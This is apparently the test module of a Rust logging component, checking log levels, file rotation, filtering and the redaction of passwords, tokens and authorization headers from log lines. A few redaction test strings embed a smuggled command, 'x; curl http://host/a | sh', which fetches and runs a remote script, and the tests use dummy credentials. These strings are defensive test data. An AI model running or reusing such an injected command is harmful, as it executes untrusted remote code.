    dir.join(FILE)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn msgs(log: &Log, q: &Query) -> Vec<String> {
        log.entries(q).into_iter().map(|(_, e)| e.msg).collect()
    }

    fn all() -> Query {
        Query {
            limit: 100,
            ..Query::default()
        }
    }

    /// Runs `f` with `log` as the thread's subscriber.
    fn with_events(log: &Arc<Log>, f: impl FnOnce()) {
        let subscriber = Registry::default().with(log.layer());
        tracing::subscriber::with_default(subscriber, f);
    }

    #[test]
    fn the_level_picks_what_is_logged() {
        let log = Log::new(Level::Info);
        let emit_all = || {
            tracing::error!("e");
            tracing::warn!("w");
            tracing::info!("i");
            tracing::debug!("d");
            tracing::trace!("t");
        };
        // Info is the default: errors, warnings and info, in this order.
        with_events(&log, emit_all);
        assert_eq!(msgs(&log, &all()), ["i", "w", "e"]);
        // A higher level takes more, the next entry on.
        log.set_level(Level::Debug);
        with_events(&log, emit_all);
        assert_eq!(&msgs(&log, &all())[..5], ["t", "d", "i", "w", "e"]);
        // A lower one takes less.
        let before = log.entries(&all()).len();
        log.set_level(Level::Error);
        with_events(&log, emit_all);
        assert_eq!(log.entries(&all()).len(), before + 1);
        log.set_level(Level::Warn);
        with_events(&log, emit_all);
        assert_eq!(log.entries(&all()).len(), before + 3);
    }

    #[test]
    fn the_level_names() {
        for (text, level) in [
            ("error", Level::Error),
            (" WARN ", Level::Warn),
            ("warning", Level::Warn),
            ("Info", Level::Info),
            ("debug", Level::Debug),
            ("trace", Level::Debug),
        ] {
            assert_eq!(Level::parse(text), Some(level), "{text}");
        }
        for text in ["", "loud", "off", "5"] {
            assert_eq!(Level::parse(text), None, "{text}");
        }
        assert_eq!(Level::default(), Level::Info);
        assert!(Level::Error < Level::Warn && Level::Info < Level::Debug);
        assert_eq!(serde_json::to_string(&Level::Warn).unwrap(), "\"warn\"");
        for l in Level::ALL {
            assert_eq!(Level::parse(l.as_str()), Some(l));
        }
    }

    #[test]
    fn an_event_carries_its_node_and_fields() {
        let log = Log::new(Level::Debug);
        with_events(&log, || {
            tracing::warn!(
                node = "box-1",
                node_id = "n1",
                clean = false,
                "the link ended"
            );
            tracing::info!(node = %"box-2", "no id");
            tracing::info!("about nothing");
        });
        let got = log.entries(&all());
        assert_eq!(got[0].1.node, None);
        assert_eq!(got[1].1.node.as_deref(), Some("box-2"));
        assert_eq!(got[1].1.node_id, None);
        let e = &got[2].1;
        assert_eq!(e.level, Level::Warn);
        assert_eq!(e.msg, "the link ended clean=false");
        assert_eq!(
            (e.node.as_deref(), e.node_id.as_deref()),
            (Some("box-1"), Some("n1"))
        );
        assert_eq!(log.nodes(), [("n1".to_string(), "box-1".to_string())]);
    }

    #[test]
    fn a_dynamic_level_goes_through_tracing() {
        let log = Log::new(Level::Info);
        with_events(&log, || {
            for l in Level::ALL {
                emit(l, Some(("box", "n1")), &format!("at {l}"));
            }
        });
        let got: Vec<_> = log
            .entries(&all())
            .into_iter()
            .map(|(_, e)| (e.level, e.msg, e.node_id))
            .collect();
        assert_eq!(
            got,
            [
                (Level::Info, "at info".into(), Some("n1".into())),
                (Level::Warn, "at warn".into(), Some("n1".into())),
                (Level::Error, "at error".into(), Some("n1".into())),
            ]
        );
    }

    #[test]
    fn secrets_are_taken_out() {
        for (text, gone) in [
            ("sudo password=hunter2 refused", "hunter2"),
            ("sudo Password: hunter2 refused", "hunter2"),
            ("retry with token=abc123def", "abc123def"),
            (r#"body {"password":"hunter2","user":"a"}"#, "hunter2"),
            (r#"escaped {\"password\":\"hunter2\"}"#, "hunter2"),
            ("password='two words' x", "two words"),
            // Escaped quotes close at the next escaped quote: a secret of
            // several words goes whole.
            (
                r#"request failed: {\"user\":\"bob\",\"password\":\"correct horse battery\"}"#,
                "correct horse",
            ),
            (
                r#"request failed: {\"user\":\"bob\",\"password\":\"correct horse battery\"}"#,
                "battery",
            ),
            ("api_key=sk-12345 and API-KEY: sk-67890", "sk-12345"),
            ("api_key=sk-12345 and API-KEY: sk-67890", "sk-67890"),
            ("Authorization: Bearer sk-live-1", "sk-live-1"),
            ("authorization: basic dXNlcjpwdw==", "dXNlcjpwdw"),
            ("Cookie: nerve_ui=cookievalue1", "cookievalue1"),
            ("curl -H 'Authorization: Bearer abcdef' x", "abcdef"),
            ("via http://alice:pa55w0rd@proxy:3128/x", "pa55w0rd"),
            ("via http://alice:pa55w0rd@proxy:3128/x", "alice"),
            (
                "nerve://pair?center=https%3A%2F%2Fc&code=abcd1234efgh&pin=PIN",
                "abcd1234efgh",
            ),
            (
                "a harness token nrv_abcdefghijklmnopqrst was made",
                "nrv_abcdef",
            ),
            ("sealed=BASE64DATA== iv=1", "BASE64DATA"),
            // The forms of a command line: a flag and its value after a
            // space, a value after a tab, the credential of any scheme.
            (
                "no allow rule matches mysql -u root --password hunter2 db",
                "hunter2",
            ),
            (
                "gh auth login --with-token ghp_abcdef123456",
                "ghp_abcdef123456",
            ),
            ("login --api-key sk-1 --token sk-2", "sk-1"),
            ("login --api-key sk-1 --token sk-2", "sk-2"),
            ("tool --secret 'two words' x", "two words"),
            ("tool --PASSWORD hunter2", "hunter2"),
            ("password=\thunter2 next", "hunter2"),
            ("password:\t \thunter2 next", "hunter2"),
            (
                "curl -H 'Authorization: token ghp_abcdef123456' https://api.example/",
                "ghp_abcdef123456",
            ),
            ("Authorization: Negotiate YIIabc123 more", "YIIabc123"),
            ("Proxy-Authorization: Digest abcdef123456", "abcdef123456"),
        ] {
            let out = redact(text);
            assert!(!out.contains(gone), "{text:?} -> {out:?}");
            assert!(out.contains(REDACTED), "{text:?} -> {out:?}");
        }
    }

    #[test]
    fn what_is_not_a_secret_stays() {
        for text in [
            "a harness token was made",
            "no harness token yet: the HTTP endpoint refuses every client",
            "NERVE_CENTER_HARNESS_TOKEN or --harness-token",
            "exit code: 2 after 5 s",
            "fs.read refused (forbidden): no allow rule matches /etc/hostname",
            "the pin is PIN and the center https://lab.example:7443/x",
            "ssh://git@host/repo and http://host:3128/",
            "nrv_short and nrv_ alone",
            "tokens: 3, passwords are never logged",
            // A flag named like a secret in prose, or with a file or a
            // placeholder for its value, holds no secret.
            "set --harness-token (NERVE_CENTER_HARNESS_TOKEN) or use --ui 127.0.0.1:<port>",
            "mysql --password-file /etc/mysql/pw db",
            "usage: tool --token <value> --password $PASS",
            "über ünïcode — täxt with 日本語",
        ] {
            assert_eq!(redact(text), text);
        }
        // A pairing code is kept apart from the pin in the same link.
        let link = redact("nerve://pair?center=x&code=abc123&pin=PIN");
        assert!(link.ends_with("&pin=PIN"), "{link}");
    }

    /// A quote that is never closed ends no secret: the word after it goes and
    /// the rest of the message stays.
    #[test]
    fn an_unclosed_quote_after_a_secret_name_keeps_the_rest_of_the_message() {
        for (text, kept, gone) in [
            (
                "tool --password \"unterminated and the rest of the reason",
                "and the rest of the reason",
                "unterminated",
            ),
            ("tool --password 'x and the rest", "and the rest", "'x "),
            (
                "sh -c \"mysql --password 'x; curl http://host/a | sh\"",
                "curl http://host/a | sh",
                "'x;",
            ),
            ("password=\"abc def ghi", "def ghi", "abc"),
            // A command quoted as a refusal's reason quotes it, with `\"`
            // for each quote in it: closed, the value is what is inside; not
            // closed, it is the word after the quote.
            (
                r#"no allow rule matches the command "mysql --password \"x; curl http://host/a | sh""#,
                "curl http://host/a | sh",
                "x;",
            ),
            (
                r#"no allow rule matches the command "mysql --password \"my pass\" db""#,
                " db\"",
                "my pass",
            ),
            ("token: 'abc, then more", "then more", "abc"),
        ] {
            let out = redact(text);
            assert!(out.contains(kept), "{text:?} -> {out:?}");
            assert!(!out.contains(gone), "{text:?} -> {out:?}");
            assert!(out.contains(REDACTED), "{text:?} -> {out:?}");
        }
        // A quote that closes still holds spaces, and a value at the end of
        // the text still goes.
        assert_eq!(
            redact("--password 'two words' x"),
            "--password '[redacted]' x"
        );
        assert_eq!(redact("password=\"abc"), "password=\"[redacted]");
        assert_eq!(
            redact(r#"{\"user\":\"bob\",\"password\":\"two words\"}"#),
            r#"{\"user\":\"bob\",\"password\":\"[redacted]\"}"#
        );
        assert_eq!(
            redact(r#"the command "mysql --password \"my pass\" db""#),
            r#"the command "mysql --password \"[redacted]\" db""#
        );
    }

    #[test]
    fn redaction_does_not_split_a_character() {
        for text in [
            "password=äöü日本語 next",
            "token=日本語",
            "Bearer ünï",
            "http://üser:pässword@host/x",
            "password=",
            "token:",
            "x password",
            "\"password\"",
            "password=\"unclosed",
            "ä password:\u{1F600}",
        ] {
            let out = redact(text);
            assert!(
                !out.contains("pässword") && !out.contains("日本語"),
                "{text}: {out}"
            );
        }
    }

    #[test]
    fn an_entry_is_stripped_cut_and_flat() {
        let log = Log::new(Level::Info);
        log.set_secret("sudo", Some("s3cr3t-pw"));
        log.record(
            Level::Info,
            None,
            "line one\nline two\r\ttab s3cr3t-pw token=abc",
        );
        log.record(Level::Info, None, &"x".repeat(MSG_MAX + 50));
        let got = msgs(&log, &all());
        assert_eq!(got[1], "line one line two  tab [redacted] token=[redacted]");
        assert_eq!(got[0].chars().count(), MSG_MAX + 1);
        assert!(got[0].ends_with('…'));
        // A secret that is let go is no longer taken out.
        log.set_secret("sudo", None);
        log.record(Level::Info, None, "s3cr3t-pw again");
        assert_eq!(msgs(&log, &all())[0], "s3cr3t-pw again");
        // Replaced, not added.
        log.set_secret("sudo", Some("one-one"));
        log.set_secret("sudo", Some("two-two"));
        log.record(Level::Info, None, "one-one two-two");
        assert_eq!(msgs(&log, &all())[0], "one-one [redacted]");
    }

    /// A tab or a line break between a name and its value is a gap like a
    /// space: the entry is flat before it is checked.
    #[test]
    fn a_secret_after_a_control_character_is_taken_out() {
        let log = Log::new(Level::Info);
        for text in [
            "password=\thunter2 next",
            "password:\n hunter2 next",
            "--password\thunter2 next",
            "Authorization:\ttoken ghp_abcdef123456",
        ] {
            log.record(Level::Info, None, text);
            let got = msgs(&log, &all())[0].clone();
            assert!(
                !got.contains("hunter2") && !got.contains("ghp_abc"),
                "{text:?} -> {got:?}"
            );
            assert!(got.contains(REDACTED), "{text:?} -> {got:?}");
        }
    }

    /// A line made elsewhere than in a `Log` is flat, redacted and cut as an
    /// entry is.
    #[test]
    fn scrub_flattens_before_it_redacts() {
        for text in [
            "password:\nhunter2",
            "token =\n  hunter2",
            "--password\nhunter2",
            "Authorization: Bearer\nhunter2",
        ] {
            let got = scrub(text);
            assert!(!got.contains("hunter2"), "{text:?} -> {got:?}");
            assert!(!got.contains('\n'), "{text:?} -> {got:?}");
            assert!(got.contains(REDACTED), "{text:?} -> {got:?}");
        }
        let long = scrub(&"x".repeat(MSG_MAX + 5));
        assert_eq!(long.chars().count(), MSG_MAX + 1);
        assert!(long.ends_with('…'));
    }

    /// A short password held back is hidden where it stands alone, and a word
    /// that only contains it is left whole, so nothing spells it out.
    #[test]
    fn a_short_held_secret_is_replaced_as_a_whole_word_or_not_at_all() {
        let log = Log::new(Level::Info);
        log.set_secret("sudo", Some("in"));
        log.record(
            Level::Info,
            None,
            "linked to center lab; the node is running in lab",
        );
        assert_eq!(
            msgs(&log, &all())[0],
            "linked to center lab; the node is running [redacted] lab"
        );
        log.set_secret("sudo", Some("1234"));
        log.record(
            Level::Info,
            None,
            "pw 1234, id 12345 and x1234 and (1234) and 1234",
        );
        assert_eq!(
            msgs(&log, &all())[0],
            "pw [redacted], id 12345 and x1234 and ([redacted]) and [redacted]"
        );
        // A secret that starts or ends with a mark needs no boundary there.
        log.set_secret("sudo", Some("a!"));
        log.record(Level::Info, None, "say a! then ba! and a!b");
        assert_eq!(
            msgs(&log, &all())[0],
            "say [redacted] then ba! and [redacted]b"
        );
        // A longer one is replaced wherever it is.
        log.set_secret("sudo", Some("longsecret-9"));
        log.record(Level::Info, None, "xlongsecret-9y");
        assert_eq!(msgs(&log, &all())[0], "x[redacted]y");
    }

    /// When the file can be copied aside but not moved, it is started again in
    /// place: it stays within its limit and the older half has its lines.
    #[cfg(unix)]
    #[test]
    fn a_file_that_cannot_be_moved_but_can_be_copied_is_started_again() {
        use std::os::unix::fs::PermissionsExt;
        /// Gives the folder its rights back, also when the test fails.
        struct Restore(std::path::PathBuf);
        impl Drop for Restore {
            fn drop(&mut self) {
                let _ = std::fs::set_permissions(&self.0, std::fs::Permissions::from_mode(0o700));
            }
        }
        let d = tempfile::tempdir().unwrap();
        let path = file_in(d.path());
        let old = d.path().join("log.jsonl.1");
        std::fs::write(&old, "").unwrap();
        let log = Log::new(Level::Info);
        log.attach_file_with_limit(&path, 400).unwrap();
        // Without the right to change the folder a rename fails, and the files,
        // which are writable, can still be copied over.
        let _restore = Restore(d.path().to_path_buf());
        std::fs::set_permissions(d.path(), std::fs::Permissions::from_mode(0o500)).unwrap();
        for i in 0..30 {
            log.record(Level::Info, None, &format!("entry number {i:02}"));
            assert!(std::fs::metadata(&path).unwrap().len() <= 400, "after {i}");
        }
        let text = std::fs::read_to_string(&path).unwrap();
        assert!(text.trim_end().ends_with("entry number 29\"}"), "{text}");
        let before = std::fs::read_to_string(&old).unwrap();
        assert!(before.contains("entry number"), "{before:?}");
        assert!(
            before
                .lines()
                .all(|l| serde_json::from_str::<Entry>(l).is_ok())
        );
        assert_eq!(log.entries(&all()).len(), 30);
    }

    /// When the file can be neither moved nor copied aside, it keeps its lines:
    /// nothing is written to it, and it says why, until the move works again.
    #[test]
    fn a_file_that_can_be_neither_moved_nor_copied_keeps_its_lines() {
        let d = tempfile::tempdir().unwrap();
        let path = file_in(d.path());
        let mut sink = Sink::new(path.clone(), 400);
        // A folder with a file in it can be neither replaced nor written over.
        let old = d.path().join("log.jsonl.1");
        std::fs::create_dir(&old).unwrap();
        std::fs::write(old.join("keep"), "x").unwrap();
        let line = |i: u32| format!("{{\"entry\":{i:04}}}\n");
        let mut written = 0;
        let err = loop {
            assert!(written < 200, "the file grew past its limit");
            match sink.append(line(written).as_bytes()) {
                Ok(()) => written += 1,
                Err(e) => break e,
            }
        };
        assert!(written > 5, "{written}");
        assert!(
            err.to_string().contains("cannot be moved or copied aside")
                && err.to_string().contains("lines are not written"),
            "{err}"
        );
        // Every line it took is still there, and it has not grown since.
        let expect: String = (0..written).map(line).collect();
        assert_eq!(std::fs::read_to_string(&path).unwrap(), expect);
        for _ in 0..5 {
            assert!(sink.append(line(999).as_bytes()).is_err());
        }
        assert_eq!(std::fs::read_to_string(&path).unwrap(), expect);
        // The move is not tried again for each line, but after a while.
        assert!(sink.blocked.is_some());
        std::fs::remove_dir_all(&old).unwrap();
        assert!(sink.append(line(1000).as_bytes()).is_err());
        sink.blocked = None;
        sink.append(line(1000).as_bytes()).unwrap();
        assert_eq!(std::fs::read_to_string(&old).unwrap(), expect);
        assert_eq!(std::fs::read_to_string(&path).unwrap(), line(1000));
    }

    #[test]
    fn the_secrets_stay_out_of_the_file_too() {
        let d = tempfile::tempdir().unwrap();
        let log = Log::new(Level::Info);
        log.attach_file(file_in(d.path())).unwrap();
        log.set_secret("token", Some("plain-secret-token"));
        log.record(
            Level::Warn,
            Some(("box", "n1")),
            "plain-secret-token and password=pw1",
        );
        let text = std::fs::read_to_string(file_in(d.path())).unwrap();
        assert!(
            !text.contains("plain-secret-token") && !text.contains("pw1"),
            "{text}"
        );
        assert!(text.contains(REDACTED));
    }

    #[test]
    fn the_file_holds_json_lines_and_brings_the_window_back() {
        let d = tempfile::tempdir().unwrap();
        let path = file_in(d.path());
        let log = Log::new(Level::Info);
        // Made before the file is attached, written when it is.
        log.record(Level::Info, None, "early");
        log.attach_file(&path).unwrap();
        log.record(Level::Warn, Some(("box", "n1")), "late");
        log.record(Level::Debug, None, "below the level");
        let text = std::fs::read_to_string(&path).unwrap();
        let lines: Vec<Entry> = text
            .lines()
            .map(|l| serde_json::from_str(l).unwrap())
            .collect();
        assert_eq!(
            lines.iter().map(|e| e.msg.as_str()).collect::<Vec<_>>(),
            ["early", "late"]
        );
        assert_eq!(lines[1].node_id.as_deref(), Some("n1"));
        assert_eq!(log.file_path().as_deref(), Some(path.as_path()));
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
            assert_eq!(mode, 0o600);
        }
        // A restart: the window starts with what the file has.
        let again = Log::new(Level::Info);
        again.record(Level::Info, None, "startup");
        again.attach_file(&path).unwrap();
        assert_eq!(msgs(&again, &all()), ["startup", "late", "early"]);
        let file = std::fs::read_to_string(&path).unwrap();
        assert_eq!(file.lines().count(), 3);
        // The download is the file.
        let bytes = again.file_bytes().unwrap().unwrap();
        assert_eq!(bytes, file.as_bytes());
        assert!(Log::new(Level::Info).file_bytes().is_none());
    }

    #[test]
    fn a_full_file_moves_aside_and_the_download_holds_both() {
        let d = tempfile::tempdir().unwrap();
        let path = file_in(d.path());
        let log = Log::new(Level::Info);
        log.attach_file_with_limit(&path, 400).unwrap();
        for i in 0..40 {
            log.record(Level::Info, None, &format!("entry number {i:02}"));
        }
        let old = d.path().join("log.jsonl.1");
        assert!(old.exists());
        let size = |p: &Path| std::fs::metadata(p).unwrap().len();
        assert!(size(&path) <= 400 && size(&old) <= 400);
        // Newest at the end of the download, in order, with none cut in half.
        let text = String::from_utf8(log.file_bytes().unwrap().unwrap()).unwrap();
        let nums: Vec<u32> = text
            .lines()
            .map(|l| {
                let e: Entry = serde_json::from_str(l).unwrap();
                e.msg.rsplit(' ').next().unwrap().parse().unwrap()
            })
            .collect();
        assert_eq!(*nums.last().unwrap(), 39);
        assert!(nums.windows(2).all(|w| w[0] + 1 == w[1]), "{nums:?}");
        // Only the window past the files is lost; the window itself is whole.
        assert_eq!(log.entries(&all()).len(), 40);
    }

    #[test]
    fn the_window_is_bounded_and_numbered() {
        let log = Log::new(Level::Info);
        for i in 0..KEEP + 10 {
            log.record(Level::Info, None, &format!("{i}"));
        }
        let got = log.entries(&Query {
            limit: usize::MAX,
            ..Query::default()
        });
        assert_eq!(got.len(), KEEP);
        assert_eq!(got[0].1.msg, (KEEP + 9).to_string());
        assert_eq!(got[0].0, (KEEP + 10) as u64);
        // Asking for what came after the last one seen.
        let last = got[0].0;
        log.record(Level::Info, None, "new");
        let q = Query {
            after: Some(last),
            limit: 10,
            ..Query::default()
        };
        assert_eq!(msgs(&log, &q), ["new"]);
    }

    #[test]
    fn a_view_filters_by_level_node_and_text() {
        let log = Log::new(Level::Debug);
        log.record(Level::Error, None, "the state file cannot be written");
        log.record(Level::Warn, Some(("alpha", "n1")), "link dropped");
        log.record(Level::Info, Some(("alpha", "n1")), "link up");
        log.record(Level::Info, Some(("beta", "n2")), "link up");
        log.record(Level::Debug, Some(("beta", "n2")), "describe refreshed");
        let q = |f: &dyn Fn(&mut Query)| {
            let mut q = all();
            f(&mut q);
            msgs(&log, &q)
        };
        assert_eq!(q(&|_| {}).len(), 5);
        assert_eq!(q(&|q| q.level = Some(Level::Error)).len(), 1);
        assert_eq!(
            q(&|q| q.level = Some(Level::Warn)),
            ["link dropped", "the state file cannot be written"]
        );
        assert_eq!(q(&|q| q.level = Some(Level::Info)).len(), 4);
        assert_eq!(
            q(&|q| q.node = Some("n2".into())),
            ["describe refreshed", "link up"]
        );
        assert_eq!(
            q(&|q| q.node = Some(NO_NODE.into())),
            ["the state file cannot be written"]
        );
        assert_eq!(q(&|q| q.text = Some("  LINK ".into())).len(), 3);
        // The node's name counts as text.
        assert_eq!(q(&|q| q.text = Some("beta".into())).len(), 2);
        assert_eq!(
            q(&|q| {
                q.node = Some("n1".into());
                q.level = Some(Level::Warn);
                q.text = Some("dropped".into());
            }),
            ["link dropped"]
        );
        assert!(q(&|q| q.node = Some("gone".into())).is_empty());
        assert_eq!(q(&|q| q.limit = 2).len(), 2);
        assert_eq!(
            log.nodes(),
            [
                ("n1".to_string(), "alpha".to_string()),
                ("n2".to_string(), "beta".to_string())
            ]
        );
    }

    #[test]
    fn a_length_of_time_is_told_for_a_person() {
        let secs = std::time::Duration::from_secs;
        assert_eq!(span(std::time::Duration::from_millis(850)), "850 ms");
        assert_eq!(span(secs(12)), "12 s");
        assert_eq!(span(secs(184)), "3 min 4 s");
        assert_eq!(span(secs(600)), "10 min");
        assert_eq!(span(secs(7500)), "2 h 5 min");
        assert_eq!(span(secs(7200)), "2 h");
        assert_eq!(span(secs(3 * 86_400 + 5 * 3600)), "3 d 5 h");
        assert_eq!(span(secs(3 * 86_400)), "3 d");
    }

    /// How a call that ended without a result is logged.
    #[test]
    fn refused_calls_are_info_and_failed_calls_are_told_by_their_cause() {
        use ErrorCode::*;
        let outcome = |c: ErrorCode| call_outcome(&c, false);
        for refused in [Forbidden, Disabled] {
            assert_eq!(outcome(refused), (Level::Info, Outcome::Refused));
        }
        for warn in [Unavailable, Busy, Timeout, TooLarge, ConnectionLost] {
            assert_eq!(outcome(warn), (Level::Warn, Outcome::Failed));
        }
        assert_eq!(outcome(Internal), (Level::Error, Outcome::Failed));
        assert_eq!(outcome(Cancelled), (Level::Debug, Outcome::Cancelled));
        // What the call itself got wrong is not the program's fault.
        for info in [
            InvalidArgs,
            UnknownMember,
            Other("io".into()),
            Other("bad_path".into()),
        ] {
            assert_eq!(outcome(info), (Level::Info, Outcome::Failed));
        }
        // A node the owner switched off answers `unavailable`, but that is a
        // refusal.
        assert_eq!(
            call_outcome(&Unavailable, true),
            (Level::Info, Outcome::Refused)
        );
    }

    #[test]
    fn a_call_line_says_what_it_was_and_why() {
        let took = std::time::Duration::from_millis(1500);
        let line = |e: RpcError, refused_here| call_line("fs.read", &e, took, refused_here);
        assert_eq!(
            line(
                RpcError::forbidden("no allow rule matches /etc/hostname"),
                false
            ),
            (
                Level::Info,
                "fs.read was refused (forbidden): no allow rule matches /etc/hostname".into()
            )
        );
        assert_eq!(
            line(
                RpcError::new(ErrorCode::Timeout, "the node did not answer in time"),
                false
            ),
            (
                Level::Warn,
                "fs.read failed (timeout) after 1 s: the node did not answer in time".into()
            )
        );
        assert_eq!(
            line(
                RpcError::new(ErrorCode::Other("io".into()), "no such file"),
                false
            ),
            (
                Level::Info,
                "fs.read failed (io) after 1 s: no such file".into()
            )
        );
        assert_eq!(
            line(RpcError::new(ErrorCode::Cancelled, "cancelled"), false),
            (Level::Debug, "fs.read was cancelled after 1 s".into())
        );
        // The reason is cut, so a command line in it cannot fill the log.
        let long = line(RpcError::internal("x".repeat(5000)), false).1;
        assert!(long.chars().count() < 400, "{}", long.len());
        // The reason goes through the same redaction as any other message.
        let log = Log::new(Level::Info);
        let (level, text) = line(
            RpcError::forbidden("no rule matches curl -H 'Authorization: Bearer abc123' x"),
            false,
        );
        log.record(level, None, &text);
        assert!(!msgs(&log, &all())[0].contains("abc123"));
    }

    #[test]
    fn time_is_shown_in_utc() {
        assert_eq!(iso(0), "1970-01-01T00:00:00.000Z");
        assert_eq!(iso(1_791_900_202_123), "2026-10-13T14:03:22.123Z");
        // A leap day.
        assert_eq!(
            iso(1_709_164_800_000 + 3_600_000),
            "2024-02-29T01:00:00.000Z"
        );
        let e = Entry {
            ts: 0,
            level: Level::Warn,
            node: Some("box".into()),
            node_id: None,
            msg: "m".into(),
        };
        assert_eq!(echo_line(&e), "1970-01-01T00:00:00.000Z WARN  box: m");
    }
}
